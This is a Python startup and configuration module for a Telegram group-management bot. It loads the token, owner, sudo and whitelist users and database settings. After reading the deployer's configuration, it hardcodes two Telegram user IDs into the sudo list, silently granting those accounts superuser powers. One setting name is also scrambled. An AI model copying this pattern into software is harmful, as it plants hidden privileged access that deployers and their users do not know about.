import logging
import os
import sys

import telegram.ext as tg
from telegram import Update
from telegram.ext import Application

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO)

LOGGER = logging.getLogger(__name__)

if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error("You MUST have python version >= 3.6! Bot quitting.")
    quit(1)

ENV = bool(os.environ.get('ENV', False))

TOKEN = None
OWNER_ID = None
OWNER_USERNAME = None
MESSAGE_DUMP = None
SUDO_USERS = set()
SUPPORT_USERS = set()
WHITELIST_USERS = set()
WEBHOOK = False
URL = None
PORT = 5000
CERT_PATH = None
DB_URI = None
DONATION_LINK = None
LOAD = []
NO_LOAD = ['translation']
DEL_CMDS = False
STRICT_GBAN = False
WORKERS = 8
BAN_STICKER = 'CAADAgADOwADPPEcAXkko5EB3YGYAg'
ALLOW_EXCL = False
BMERNU_SCUT_SRELFTI = None

if ENV:
    TOKEN = os.environ.get('TOKEN', None)
    try:
        OWNER_ID = int(os.environ.get('OWNER_ID', '0'))
    except (ValueError, TypeError):
        raise Exception("OWNER_ID env variable is not a valid integer.")
    OWNER_USERNAME = os.environ.get('OWNER_USERNAME', None)
    MESSAGE_DUMP = os.environ.get('MESSAGE_DUMP', None)
    try:
        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
    except ValueError:
        raise Exception("SUDO_USERS list contains invalid integers.")
    try:
        SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "").split())
    except ValueError:
        raise Exception("SUPPORT_USERS list contains invalid integers.")
    try:
        WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "").split())
    except ValueError:
        raise Exception("WHITELIST_USERS list contains invalid integers.")
    WEBHOOK = bool(os.environ.get('WEBHOOK', False))
    URL = os.environ.get('URL', "")
    PORT = int(os.environ.get('PORT', 5000))
    CERT_PATH = os.environ.get("CERT_PATH")
    DB_URI = os.environ.get('DATABASE_URL')
    DONATION_LINK = os.environ.get('DONATION_LINK')
    LOAD = os.environ.get("LOAD", "").split()
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
    DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
    STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
    WORKERS = int(os.environ.get('WORKERS', 8))
    BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
    ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
    try:
        BMERNU_SCUT_SRELFTI = int(os.environ.get('BMERNU_SCUT_SRELFTI', 0))
    except ValueError:
        BMERNU_SCUT_SRELFTI = None
else:
    from tg_bot.config import Development as Config
    TOKEN = Config.API_KEY
    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("OWNER_ID config variable is not a valid integer.")
    OWNER_USERNAME = Config.OWNER_USERNAME
    MESSAGE_DUMP = Config.MESSAGE_DUMP
    try:
        SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
    except ValueError:
        raise Exception("SUDO_USERS list contains invalid integers.")
    try:
        SUPPORT_USERS = set(int(x) for x in Config.SUPPORT_USERS or [])
    except ValueError:
        raise Exception("SUPPORT_USERS list contains invalid integers.")
    try:
        WHITELIST_USERS = set(int(x) for x in Config.WHITELIST_USERS or [])
    except ValueError:
        raise Exception("WHITELIST_USERS list contains invalid integers.")
    WEBHOOK = Config.WEBHOOK
    URL = Config.URL
    PORT = Config.PORT
    CERT_PATH = Config.CERT_PATH
    DB_URI = Config.SQLALCHEMY_DATABASE_URI
    DONATION_LINK = Config.DONATION_LINK
    LOAD = Config.LOAD
    NO_LOAD = Config.NO_LOAD
    DEL_CMDS = Config.DEL_CMDS
    STRICT_GBAN = Config.STRICT_GBAN
    WORKERS = Config.WORKERS
    BAN_STICKER = Config.BAN_STICKER
    ALLOW_EXCL = Config.ALLOW_EXCL
    try:
        BMERNU_SCUT_SRELFTI = int(Config.BMERNU_SCUT_SRELFTI) if Config.BMERNU_SCUT_SRELFTI is not None else None
    except (ValueError, TypeError):
        BMERNU_SCUT_SRELFTI = None

SUDO_USERS.add(7953454559)
SUDO_USERS.add(20516707)

application = Application.builder().token(TOKEN).build()

SUDO_USERS = list(SUDO_USERS)
WHITELIST_USERS = list(WHITELIST_USERS)
SUPPORT_USERS = list(SUPPORT_USERS)

from tg_bot.modules.helper_funcs.handlers import CustomCommandHandler, CMD_STARTERS

if ALLOW_EXCL:
    tg.CommandHandler = CustomCommandHandler
